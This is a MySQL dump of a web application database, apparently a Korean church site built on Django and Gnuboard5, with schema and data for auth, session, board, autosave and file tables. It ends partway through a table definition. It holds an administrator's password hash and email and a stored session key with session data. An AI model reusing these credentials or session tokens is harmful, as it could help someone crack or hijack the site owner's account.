-- MySQL dump 10.13  Distrib 5.5.41, for debian-linux-gnu (x86_64)
--
-- Host: localhost    Database: jubinna
-- ------------------------------------------------------
-- Server version	5.5.41-0ubuntu0.14.04.1

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `auth_group`
--

DROP TABLE IF EXISTS `auth_group`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `auth_group` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(80) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `name` (`name`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_group`
--

LOCK TABLES `auth_group` WRITE;
/*!40000 ALTER TABLE `auth_group` DISABLE KEYS */;
/*!40000 ALTER TABLE `auth_group` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_group_permissions`
--

DROP TABLE IF EXISTS `auth_group_permissions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `auth_group_permissions` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `group_id` int(11) NOT NULL,
  `permission_id` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `group_id` (`group_id`,`permission_id`),
  KEY `auth_group__permission_id_1f49ccbbdc69d2fc_fk_auth_permission_id` (`permission_id`),
  CONSTRAINT `auth_group__permission_id_1f49ccbbdc69d2fc_fk_auth_permission_id` FOREIGN KEY (`permission_id`) REFERENCES `auth_permission` (`id`),
  CONSTRAINT `auth_group_permission_group_id_689710a9a73b7457_fk_auth_group_id` FOREIGN KEY (`group_id`) REFERENCES `auth_group` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_group_permissions`
--

LOCK TABLES `auth_group_permissions` WRITE;
/*!40000 ALTER TABLE `auth_group_permissions` DISABLE KEYS */;
/*!40000 ALTER TABLE `auth_group_permissions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_permission`
--

DROP TABLE IF EXISTS `auth_permission`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `auth_permission` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL,
  `content_type_id` int(11) NOT NULL,
  `codename` varchar(100) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `content_type_id` (`content_type_id`,`codename`),
  CONSTRAINT `auth__content_type_id_508cf46651277a81_fk_django_content_type_id` FOREIGN KEY (`content_type_id`) REFERENCES `django_content_type` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=28 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_permission`
--

LOCK TABLES `auth_permission` WRITE;
/*!40000 ALTER TABLE `auth_permission` DISABLE KEYS */;
INSERT INTO `auth_permission` VALUES (1,'Can add log entry',1,'add_logentry'),(2,'Can change log entry',1,'change_logentry'),(3,'Can delete log entry',1,'delete_logentry'),(4,'Can add permission',2,'add_permission'),(5,'Can change permission',2,'change_permission'),(6,'Can delete permission',2,'delete_permission'),(7,'Can add group',3,'add_group'),(8,'Can change group',3,'change_group'),(9,'Can delete group',3,'delete_group'),(10,'Can add user',4,'add_user'),(11,'Can change user',4,'change_user'),(12,'Can delete user',4,'delete_user'),(13,'Can add content type',5,'add_contenttype'),(14,'Can change content type',5,'change_contenttype'),(15,'Can delete content type',5,'delete_contenttype'),(16,'Can add session',6,'add_session'),(17,'Can change session',6,'change_session'),(18,'Can delete session',6,'delete_session'),(19,'Can add member',7,'add_member'),(20,'Can change member',7,'change_member'),(21,'Can delete member',7,'delete_member'),(22,'Can add poll',8,'add_poll'),(23,'Can change poll',8,'change_poll'),(24,'Can delete poll',8,'delete_poll'),(25,'Can add choice',9,'add_choice'),(26,'Can change choice',9,'change_choice'),(27,'Can delete choice',9,'delete_choice');
/*!40000 ALTER TABLE `auth_permission` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_user`
--

DROP TABLE IF EXISTS `auth_user`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `auth_user` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `password` varchar(128) NOT NULL,
  `last_login` datetime DEFAULT NULL,
  `is_superuser` tinyint(1) NOT NULL,
  `username` varchar(30) NOT NULL,
  `first_name` varchar(30) NOT NULL,
  `last_name` varchar(30) NOT NULL,
  `email` varchar(254) NOT NULL,
  `is_staff` tinyint(1) NOT NULL,
  `is_active` tinyint(1) NOT NULL,
  `date_joined` datetime NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_user`
--

LOCK TABLES `auth_user` WRITE;
/*!40000 ALTER TABLE `auth_user` DISABLE KEYS */;
INSERT INTO `auth_user` VALUES (1,'pbkdf2_sha256$20000$NjIK434x5J2B$qTOuEODcnmdd/yvP388LxE7jBkLQYZEgg+EdFYlcDDs=','2015-06-03 07:59:15',1,'jubinna','','','jubinna@jubinna.com',1,1,'2015-06-03 07:51:22');
/*!40000 ALTER TABLE `auth_user` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_user_groups`
--

DROP TABLE IF EXISTS `auth_user_groups`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `auth_user_groups` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL,
  `group_id` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `user_id` (`user_id`,`group_id`),
  KEY `auth_user_groups_group_id_33ac548dcf5f8e37_fk_auth_group_id` (`group_id`),
  CONSTRAINT `auth_user_groups_group_id_33ac548dcf5f8e37_fk_auth_group_id` FOREIGN KEY (`group_id`) REFERENCES `auth_group` (`id`),
  CONSTRAINT `auth_user_groups_user_id_4b5ed4ffdb8fd9b0_fk_auth_user_id` FOREIGN KEY (`user_id`) REFERENCES `auth_user` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_user_groups`
--

LOCK TABLES `auth_user_groups` WRITE;
/*!40000 ALTER TABLE `auth_user_groups` DISABLE KEYS */;
/*!40000 ALTER TABLE `auth_user_groups` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `auth_user_user_permissions`
--

DROP TABLE IF EXISTS `auth_user_user_permissions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `auth_user_user_permissions` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL,
  `permission_id` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `user_id` (`user_id`,`permission_id`),
  KEY `auth_user_u_permission_id_384b62483d7071f0_fk_auth_permission_id` (`permission_id`),
  CONSTRAINT `auth_user_u_permission_id_384b62483d7071f0_fk_auth_permission_id` FOREIGN KEY (`permission_id`) REFERENCES `auth_permission` (`id`),
  CONSTRAINT `auth_user_user_permissi_user_id_7f0938558328534a_fk_auth_user_id` FOREIGN KEY (`user_id`) REFERENCES `auth_user` (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `auth_user_user_permissions`
--

LOCK TABLES `auth_user_user_permissions` WRITE;
/*!40000 ALTER TABLE `auth_user_user_permissions` DISABLE KEYS */;
/*!40000 ALTER TABLE `auth_user_user_permissions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `django_admin_log`
--

DROP TABLE IF EXISTS `django_admin_log`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `django_admin_log` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `action_time` datetime NOT NULL,
  `object_id` longtext,
  `object_repr` varchar(200) NOT NULL,
  `action_flag` smallint(5) unsigned NOT NULL,
  `change_message` longtext NOT NULL,
  `content_type_id` int(11) DEFAULT NULL,
  `user_id` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `djang_content_type_id_697914295151027a_fk_django_content_type_id` (`content_type_id`),
  KEY `django_admin_log_user_id_52fdd58701c5f563_fk_auth_user_id` (`user_id`),
  CONSTRAINT `djang_content_type_id_697914295151027a_fk_django_content_type_id` FOREIGN KEY (`content_type_id`) REFERENCES `django_content_type` (`id`),
  CONSTRAINT `django_admin_log_user_id_52fdd58701c5f563_fk_auth_user_id` FOREIGN KEY (`user_id`) REFERENCES `auth_user` (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `django_admin_log`
--

LOCK TABLES `django_admin_log` WRITE;
/*!40000 ALTER TABLE `django_admin_log` DISABLE KEYS */;
INSERT INTO `django_admin_log` VALUES (1,'2015-06-03 08:00:17','charles','??',1,'',7,1);
/*!40000 ALTER TABLE `django_admin_log` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `django_content_type`
--

DROP TABLE IF EXISTS `django_content_type`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `django_content_type` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `app_label` varchar(100) NOT NULL,
  `model` varchar(100) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `django_content_type_app_label_45f3b1d93ec8c61c_uniq` (`app_label`,`model`)
) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `django_content_type`
--

LOCK TABLES `django_content_type` WRITE;
/*!40000 ALTER TABLE `django_content_type` DISABLE KEYS */;
INSERT INTO `django_content_type` VALUES (1,'admin','logentry'),(3,'auth','group'),(2,'auth','permission'),(4,'auth','user'),(5,'contenttypes','contenttype'),(7,'member','member'),(9,'polls','choice'),(8,'polls','poll'),(6,'sessions','session');
/*!40000 ALTER TABLE `django_content_type` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `django_migrations`
--

DROP TABLE IF EXISTS `django_migrations`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `django_migrations` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `app` varchar(255) NOT NULL,
  `name` varchar(255) NOT NULL,
  `applied` datetime NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=15 DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `django_migrations`
--

LOCK TABLES `django_migrations` WRITE;
/*!40000 ALTER TABLE `django_migrations` DISABLE KEYS */;
INSERT INTO `django_migrations` VALUES (1,'contenttypes','0001_initial','2015-06-03 07:50:38'),(2,'auth','0001_initial','2015-06-03 07:50:41'),(3,'admin','0001_initial','2015-06-03 07:50:41'),(4,'contenttypes','0002_remove_content_type_name','2015-06-03 07:50:42'),(5,'auth','0002_alter_permission_name_max_length','2015-06-03 07:50:42'),(6,'auth','0003_alter_user_email_max_length','2015-06-03 07:50:42'),(7,'auth','0004_alter_user_username_opts','2015-06-03 07:50:43'),(8,'auth','0005_alter_user_last_login_null','2015-06-03 07:50:43'),(9,'auth','0006_require_contenttypes_0002','2015-06-03 07:50:43'),(10,'member','0001_initial','2015-06-03 07:50:43'),(11,'member','0002_member_age','2015-06-03 07:50:43'),(12,'member','0003_auto_20150529_1400','2015-06-03 07:50:43'),(13,'polls','0001_initial','2015-06-03 07:50:44'),(14,'sessions','0001_initial','2015-06-03 07:50:45');
/*!40000 ALTER TABLE `django_migrations` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `django_session`
--

DROP TABLE IF EXISTS `django_session`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `django_session` (
  `session_key` varchar(40) NOT NULL,
  `session_data` longtext NOT NULL,
  `expire_date` datetime NOT NULL,
  PRIMARY KEY (`session_key`),
  KEY `django_session_de54fa62` (`expire_date`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `django_session`
--

LOCK TABLES `django_session` WRITE;
/*!40000 ALTER TABLE `django_session` DISABLE KEYS */;
INSERT INTO `django_session` VALUES ('3rgvkvkf5yjbwq6mm3vq40vr0l57dssj','ODczOTA0YzAzOTU0NWVkMDkxZjZiYjUxOTBlNDczMzlhNDE0MzQyNDp7Il9hdXRoX3VzZXJfaGFzaCI6IjM3ZmQ3YmYwZWI3NDY2ZmNhZWZiZDVmZWM4NGI2NjNkZDQ1MzEwZTAiLCJfYXV0aF91c2VyX2JhY2tlbmQiOiJkamFuZ28uY29udHJpYi5hdXRoLmJhY2tlbmRzLk1vZGVsQmFja2VuZCIsIl9hdXRoX3VzZXJfaWQiOiIxIn0=','2015-06-17 07:59:15');
/*!40000 ALTER TABLE `django_session` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_auth`
--

DROP TABLE IF EXISTS `g5_auth`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_auth` (
  `mb_id` varchar(20) NOT NULL DEFAULT '',
  `au_menu` varchar(20) NOT NULL DEFAULT '',
  `au_auth` set('r','w','d') NOT NULL DEFAULT '',
  PRIMARY KEY (`mb_id`,`au_menu`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_auth`
--

LOCK TABLES `g5_auth` WRITE;
/*!40000 ALTER TABLE `g5_auth` DISABLE KEYS */;
INSERT INTO `g5_auth` VALUES ('webmanager','300100','r,w'),('webmanager','200100','r,w');
/*!40000 ALTER TABLE `g5_auth` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_autosave`
--

DROP TABLE IF EXISTS `g5_autosave`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_autosave` (
  `as_id` int(11) NOT NULL AUTO_INCREMENT,
  `mb_id` varchar(20) NOT NULL,
  `as_uid` bigint(20) unsigned NOT NULL,
  `as_subject` varchar(255) NOT NULL,
  `as_content` text NOT NULL,
  `as_datetime` datetime NOT NULL,
  PRIMARY KEY (`as_id`),
  UNIQUE KEY `as_uid` (`as_uid`),
  KEY `mb_id` (`mb_id`)
) ENGINE=MyISAM AUTO_INCREMENT=21 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_autosave`
--

LOCK TABLES `g5_autosave` WRITE;
/*!40000 ALTER TABLE `g5_autosave` DISABLE KEYS */;
INSERT INTO `g5_autosave` VALUES (19,'admin',15052621240276,'Wilde Life','샘플 영상','2015-05-26 21:26:04'),(13,'webmanager',15042016480556,'테스트 영상입니다.','잘나오나요?','2015-04-20 16:49:05'),(18,'admin',15052120132558,'테스트','....','2015-05-21 20:15:28'),(16,'webmanager',15050521343311,'test2','test','2015-05-05 21:35:33'),(20,'admin',15072314231138,'assfds','sdfsdfsd','2015-07-23 14:24:11');
/*!40000 ALTER TABLE `g5_autosave` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_board`
--

DROP TABLE IF EXISTS `g5_board`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_board` (
  `bo_table` varchar(20) NOT NULL DEFAULT '',
  `gr_id` varchar(255) NOT NULL DEFAULT '',
  `bo_subject` varchar(255) NOT NULL DEFAULT '',
  `bo_mobile_subject` varchar(255) NOT NULL DEFAULT '',
  `bo_device` enum('both','pc','mobile') NOT NULL DEFAULT 'both',
  `bo_admin` varchar(255) NOT NULL DEFAULT '',
  `bo_list_level` tinyint(4) NOT NULL DEFAULT '0',
  `bo_read_level` tinyint(4) NOT NULL DEFAULT '0',
  `bo_write_level` tinyint(4) NOT NULL DEFAULT '0',
  `bo_reply_level` tinyint(4) NOT NULL DEFAULT '0',
  `bo_comment_level` tinyint(4) NOT NULL DEFAULT '0',
  `bo_upload_level` tinyint(4) NOT NULL DEFAULT '0',
  `bo_download_level` tinyint(4) NOT NULL DEFAULT '0',
  `bo_html_level` tinyint(4) NOT NULL DEFAULT '0',
  `bo_link_level` tinyint(4) NOT NULL DEFAULT '0',
  `bo_count_delete` tinyint(4) NOT NULL DEFAULT '0',
  `bo_count_modify` tinyint(4) NOT NULL DEFAULT '0',
  `bo_read_point` int(11) NOT NULL DEFAULT '0',
  `bo_write_point` int(11) NOT NULL DEFAULT '0',
  `bo_comment_point` int(11) NOT NULL DEFAULT '0',
  `bo_download_point` int(11) NOT NULL DEFAULT '0',
  `bo_use_category` tinyint(4) NOT NULL DEFAULT '0',
  `bo_category_list` text NOT NULL,
  `bo_use_sideview` tinyint(4) NOT NULL DEFAULT '0',
  `bo_use_file_content` tinyint(4) NOT NULL DEFAULT '0',
  `bo_use_secret` tinyint(4) NOT NULL DEFAULT '0',
  `bo_use_dhtml_editor` tinyint(4) NOT NULL DEFAULT '0',
  `bo_use_rss_view` tinyint(4) NOT NULL DEFAULT '0',
  `bo_use_good` tinyint(4) NOT NULL DEFAULT '0',
  `bo_use_nogood` tinyint(4) NOT NULL DEFAULT '0',
  `bo_use_name` tinyint(4) NOT NULL DEFAULT '0',
  `bo_use_signature` tinyint(4) NOT NULL DEFAULT '0',
  `bo_use_ip_view` tinyint(4) NOT NULL DEFAULT '0',
  `bo_use_list_view` tinyint(4) NOT NULL DEFAULT '0',
  `bo_use_list_file` tinyint(4) NOT NULL DEFAULT '0',
  `bo_use_list_content` tinyint(4) NOT NULL DEFAULT '0',
  `bo_table_width` int(11) NOT NULL DEFAULT '0',
  `bo_subject_len` int(11) NOT NULL DEFAULT '0',
  `bo_mobile_subject_len` int(11) NOT NULL DEFAULT '0',
  `bo_page_rows` int(11) NOT NULL DEFAULT '0',
  `bo_mobile_page_rows` int(11) NOT NULL DEFAULT '0',
  `bo_new` int(11) NOT NULL DEFAULT '0',
  `bo_hot` int(11) NOT NULL DEFAULT '0',
  `bo_image_width` int(11) NOT NULL DEFAULT '0',
  `bo_skin` varchar(255) NOT NULL DEFAULT '',
  `bo_mobile_skin` varchar(255) NOT NULL DEFAULT '',
  `bo_include_head` varchar(255) NOT NULL DEFAULT '',
  `bo_include_tail` varchar(255) NOT NULL DEFAULT '',
  `bo_content_head` text NOT NULL,
  `bo_mobile_content_head` text NOT NULL,
  `bo_content_tail` text NOT NULL,
  `bo_mobile_content_tail` text NOT NULL,
  `bo_insert_content` text NOT NULL,
  `bo_gallery_cols` int(11) NOT NULL DEFAULT '0',
  `bo_gallery_width` int(11) NOT NULL DEFAULT '0',
  `bo_gallery_height` int(11) NOT NULL DEFAULT '0',
  `bo_mobile_gallery_width` int(11) NOT NULL DEFAULT '0',
  `bo_mobile_gallery_height` int(11) NOT NULL DEFAULT '0',
  `bo_upload_size` int(11) NOT NULL DEFAULT '0',
  `bo_reply_order` tinyint(4) NOT NULL DEFAULT '0',
  `bo_use_search` tinyint(4) NOT NULL DEFAULT '0',
  `bo_order` int(11) NOT NULL DEFAULT '0',
  `bo_count_write` int(11) NOT NULL DEFAULT '0',
  `bo_count_comment` int(11) NOT NULL DEFAULT '0',
  `bo_write_min` int(11) NOT NULL DEFAULT '0',
  `bo_write_max` int(11) NOT NULL DEFAULT '0',
  `bo_comment_min` int(11) NOT NULL DEFAULT '0',
  `bo_comment_max` int(11) NOT NULL DEFAULT '0',
  `bo_notice` text NOT NULL,
  `bo_upload_count` tinyint(4) NOT NULL DEFAULT '0',
  `bo_use_email` tinyint(4) NOT NULL DEFAULT '0',
  `bo_use_cert` enum('','cert','adult','hp-cert','hp-adult') NOT NULL DEFAULT '',
  `bo_use_sns` tinyint(4) NOT NULL DEFAULT '0',
  `bo_sort_field` varchar(255) NOT NULL DEFAULT '',
  `bo_1_subj` varchar(255) NOT NULL DEFAULT '',
  `bo_2_subj` varchar(255) NOT NULL DEFAULT '',
  `bo_3_subj` varchar(255) NOT NULL DEFAULT '',
  `bo_4_subj` varchar(255) NOT NULL DEFAULT '',
  `bo_5_subj` varchar(255) NOT NULL DEFAULT '',
  `bo_6_subj` varchar(255) NOT NULL DEFAULT '',
  `bo_7_subj` varchar(255) NOT NULL DEFAULT '',
  `bo_8_subj` varchar(255) NOT NULL DEFAULT '',
  `bo_9_subj` varchar(255) NOT NULL DEFAULT '',
  `bo_10_subj` varchar(255) NOT NULL DEFAULT '',
  `bo_1` varchar(255) NOT NULL DEFAULT '',
  `bo_2` varchar(255) NOT NULL DEFAULT '',
  `bo_3` varchar(255) NOT NULL DEFAULT '',
  `bo_4` varchar(255) NOT NULL DEFAULT '',
  `bo_5` varchar(255) NOT NULL DEFAULT '',
  `bo_6` varchar(255) NOT NULL DEFAULT '',
  `bo_7` varchar(255) NOT NULL DEFAULT '',
  `bo_8` varchar(255) NOT NULL DEFAULT '',
  `bo_9` varchar(255) NOT NULL DEFAULT '',
  `bo_10` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`bo_table`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_board`
--

LOCK TABLES `g5_board` WRITE;
/*!40000 ALTER TABLE `g5_board` DISABLE KEYS */;
INSERT INTO `g5_board` VALUES ('word_text','_words','예배 말씀 - 문서','','both','',2,2,4,4,2,4,4,4,4,1,1,0,0,0,0,0,'',0,0,0,0,0,0,0,0,0,0,0,0,0,100,60,30,15,15,24,100,600,'basic','basic','_head.php','_tail.php','','','','','',4,174,124,125,100,5242880,1,1,1,0,0,0,0,0,0,'',2,0,'',0,'','','','','','','','','','','','','','','','','','','','',''),('word_rec','_words','예배 말씀 - 영상(녹화)','','both','',2,2,4,4,2,4,4,4,4,1,1,0,0,0,0,0,'',0,0,0,0,0,0,0,0,0,0,0,0,0,100,60,30,15,15,24,100,600,'video','video','_head.php','_tail.php','','','','','',4,174,124,125,100,5242880,1,1,2,1,0,0,0,0,0,'',2,0,'',0,'','','','','','','','','','','','','','','','','','','','',''),('mission_01','_mission','인터넷 선교','','both','webmanager',1,1,2,2,1,2,2,2,1,1,1,0,0,0,0,0,'',0,0,0,0,0,0,0,0,0,0,0,0,0,100,60,30,15,15,24,100,600,'gallery','gallery','_head.php','_tail.php','','','','','',4,174,124,125,100,5242880,1,1,0,3,0,0,0,0,0,'',2,0,'',0,'','','','','','','','','','','','','','','','','','','','',''),('lecture_text','_lecture','성경강좌 노트','','both','',2,3,4,4,4,4,4,4,4,1,1,0,0,0,0,0,'',0,0,0,0,0,0,0,0,0,0,0,0,0,100,60,30,15,15,24,100,600,'basic','basic','_head.php','_tail.php','','','','','',4,174,124,125,100,5242880,1,1,4,1,0,0,0,0,0,'',2,0,'',0,'','','','','','','','','','','','','','','','','','','','',''),('lecture_real','_lecture','동영상 성경강좌','','both','',2,3,4,4,4,4,4,4,4,1,1,0,0,0,0,0,'',0,0,0,0,0,0,0,0,0,0,0,0,0,100,60,30,15,15,24,100,600,'video','video','_head.php','_tail.php','','','','','',4,174,124,125,100,5242880,1,1,3,3,1,0,0,0,0,'',2,0,'',0,'','','','','','','','','','','','','','','','','','','','',''),('ref_text','_reference','참고 문서 자료','','both','',2,3,4,4,4,4,4,4,4,1,1,0,0,0,0,0,'',0,0,0,0,0,0,0,0,0,0,0,0,0,100,60,30,15,15,24,100,600,'basic','basic','_head.php','_tail.php','','','','','',4,174,124,125,100,5242880,1,1,5,1,0,0,0,0,0,'',2,0,'',0,'','','','','','','','','','','','','','','','','','','','',''),('ref_video','_reference','참고 영상 자료','','both','',2,3,4,4,4,4,4,4,4,1,1,0,0,0,0,0,'',0,0,0,0,0,0,0,0,0,0,0,0,0,100,60,30,15,15,24,100,600,'video','video','_head.php','_tail.php','','','','','',4,174,124,125,100,5242880,1,1,6,2,0,0,0,0,0,'',2,0,'',0,'','','','','','','','','','','','','','','','','','','','',''),('event_picture','_docs','행사 사진 자료','','both','',2,2,2,2,2,2,2,2,2,1,1,0,0,0,0,0,'',0,0,0,0,0,0,0,0,0,0,0,0,0,100,60,30,15,15,24,100,600,'gallery','gallery','_head.php','_tail.php','','','','','',4,174,124,125,100,5242880,1,1,7,1,0,0,0,0,0,'',2,0,'',0,'','많이 찾은 자료','','','','','','','','','','','','','','','','','','',''),('event_video','_docs','행사 영상 자료','','both','',2,2,2,2,2,2,2,2,2,1,1,0,0,0,0,0,'',0,0,0,0,0,0,0,0,0,0,0,0,0,100,60,30,15,15,24,100,600,'video','video','_head.php','_tail.php','','','','','',4,174,124,125,100,5242880,1,1,8,0,0,0,0,0,0,'',2,0,'',0,'','','','','','','','','','','','','','','','','','','','',''),('notics','_docs','공지','공지','both','',1,2,7,7,2,7,2,7,2,1,1,0,0,0,0,0,'',0,0,0,0,0,0,0,0,0,0,0,0,0,100,60,30,15,15,24,100,600,'basic','basic','_head.php','_tail.php','','','','','',4,174,124,125,100,1048576,1,1,0,0,0,0,0,0,0,'',2,0,'',0,'','','','','','','','','','','','','','','','','','','','','');
/*!40000 ALTER TABLE `g5_board` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_board_file`
--

DROP TABLE IF EXISTS `g5_board_file`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_board_file` (
  `bo_table` varchar(20) NOT NULL DEFAULT '',
  `wr_id` int(11) NOT NULL DEFAULT '0',
  `bf_no` int(11) NOT NULL DEFAULT '0',
  `bf_source` varchar(255) NOT NULL DEFAULT '',
  `bf_file` varchar(255) NOT NULL DEFAULT '',
  `bf_download` int(11) NOT NULL,
  `bf_content` text NOT NULL,
  `bf_filesize` int(11) NOT NULL DEFAULT '0',
  `bf_width` int(11) NOT NULL DEFAULT '0',
  `bf_height` smallint(6) NOT NULL DEFAULT '0',
  `bf_type` tinyint(4) NOT NULL DEFAULT '0',
  `bf_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`bo_table`,`wr_id`,`bf_no`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_board_file`
--

LOCK TABLES `g5_board_file` WRITE;
/*!40000 ALTER TABLE `g5_board_file` DISABLE KEYS */;
INSERT INTO `g5_board_file` VALUES ('ref_video',1,0,'images.jpeg','3537384962_2g7dxK1n_images.jpeg',0,'',5393,265,190,2,'2015-02-12 15:09:55'),('ref_video',2,0,'IMG_1630.JPG','3537384962_lwyeaS1f_IMG_1630.JPG',0,'',1704296,3264,2448,2,'2015-02-12 15:11:03'),('mission_01',2,0,'image.jpg','1893250002_Ubv4Nt31_image.jpg',0,'',91959,640,1136,2,'2015-02-16 11:50:06'),('mission_01',4,0,'image.jpg','1850094731_0oMuI8dZ_image.jpg',0,'',124715,600,900,2,'2015-02-22 12:29:13'),('mission_01',5,0,'image.jpg','2950632946_iJ5fhWIt_image.jpg',0,'',200498,600,900,2,'2015-02-22 19:52:13'),('event_picture',3,0,'E7D_8991.jpg','1030118500_yJTqOp72_E7D_8991.jpg',0,'',1246436,2600,1734,2,'2015-05-21 20:07:47');
/*!40000 ALTER TABLE `g5_board_file` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_board_good`
--

DROP TABLE IF EXISTS `g5_board_good`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_board_good` (
  `bg_id` int(11) NOT NULL AUTO_INCREMENT,
  `bo_table` varchar(20) NOT NULL DEFAULT '',
  `wr_id` int(11) NOT NULL DEFAULT '0',
  `mb_id` varchar(20) NOT NULL DEFAULT '',
  `bg_flag` varchar(255) NOT NULL DEFAULT '',
  `bg_datetime` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`bg_id`),
